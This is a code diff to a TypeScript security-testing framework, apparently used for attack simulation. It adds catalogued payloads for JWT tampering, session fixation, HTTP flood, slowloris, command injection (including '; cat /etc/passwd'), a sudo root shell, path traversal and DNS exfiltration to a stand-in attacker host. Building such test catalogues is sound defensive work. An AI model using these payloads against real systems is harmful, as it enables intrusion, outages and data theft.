@@ -533,6 +533,134 @@ export class AttackSimulationFramework {
         description: 'Default credentials',
         expectedBehavior: 'Gain unauthorized access',
       },
+      {
+        payloadId: uuidv4(),
+        vector: 'jwt-tampering',
+        payload: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.tampered',
+        encoding: 'raw',
+        description: 'JWT token tampering',
+        expectedBehavior: 'Bypass authentication with tampered token',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'session-fixation',
+        payload: 'PHPSESSID=attacker-controlled',
+        encoding: 'raw',
+        description: 'Session fixation attack',
+        expectedBehavior: 'Fixate user session to attacker-controlled ID',
+      },
+    ]);
+
+    // DoS payloads
+    this.payloadLibrary.set('dos', [
+      {
+        payloadId: uuidv4(),
+        vector: 'http-flood',
+        payload: 'GET / HTTP/1.1\r\nHost: target\r\n\r\n'.repeat(1000),
+        encoding: 'raw',
+        description: 'HTTP flood',
+        expectedBehavior: 'Overwhelm server with requests',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'slowloris',
+        payload: 'GET / HTTP/1.1\r\nHost: target\r\nX-a: ',
+        encoding: 'raw',
+        description: 'Slowloris attack',
+        expectedBehavior: 'Keep connections open to exhaust resources',
+      },
+    ]);
+
+    // RCE payloads
+    this.payloadLibrary.set('rce', [
+      {
+        payloadId: uuidv4(),
+        vector: 'command-injection',
+        payload: '; cat /etc/passwd',
+        encoding: 'raw',
+        description: 'Command injection via semicolon',
+        expectedBehavior: 'Execute arbitrary system commands',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'pipe-injection',
+        payload: '| whoami',
+        encoding: 'raw',
+        description: 'Command injection via pipe',
+        expectedBehavior: 'Execute arbitrary system commands',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'backtick-injection',
+        payload: '`id`',
+        encoding: 'raw',
+        description: 'Command injection via backticks',
+        expectedBehavior: 'Execute arbitrary system commands',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'eval-injection',
+        payload: 'eval("system(\'whoami\')")',
+        encoding: 'raw',
+        description: 'Code injection via eval',
+        expectedBehavior: 'Execute arbitrary code',
+      },
+    ]);
+
+    // Privilege escalation payloads
+    this.payloadLibrary.set('privilege-escalation', [
+      {
+        payloadId: uuidv4(),
+        vector: 'path-traversal',
+        payload: '../../../etc/passwd',
+        encoding: 'raw',
+        description: 'Path traversal attack',
+        expectedBehavior: 'Access files outside intended directory',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'sudo-injection',
+        payload: 'sudo -u root /bin/bash',
+        encoding: 'raw',
+        description: 'Sudo privilege escalation',
+        expectedBehavior: 'Gain root privileges',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'race-condition',
+        payload: 'TOCTOU: Time-of-check to time-of-use',
+        encoding: 'raw',
+        description: 'Race condition exploitation',
+        expectedBehavior: 'Exploit timing-based vulnerability',
+      },
+    ]);
+
+    // Data exfiltration payloads
+    this.payloadLibrary.set('data-exfiltration', [
+      {
+        payloadId: uuidv4(),
+        vector: 'dns-exfiltration',
+        payload: 'exfil.attacker.com',
+        encoding: 'raw',
+        description: 'DNS-based data exfiltration',
+        expectedBehavior: 'Exfiltrate data via DNS queries',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'oast',
+        payload: 'https://oast.me/callback',
+        encoding: 'raw',
+        description: 'Out-of-band application security testing',
+        expectedBehavior: 'Trigger external callback with data',
+      },
+      {
+        payloadId: uuidv4(),
+        vector: 'base64-exfil',
+        payload: Buffer.from('sensitive-data').toString('base64'),
+        encoding: 'base64',
+        description: 'Base64-encoded data exfiltration',
+        expectedBehavior: 'Exfiltrate encoded sensitive data',
+      },
     ]);
   }
 
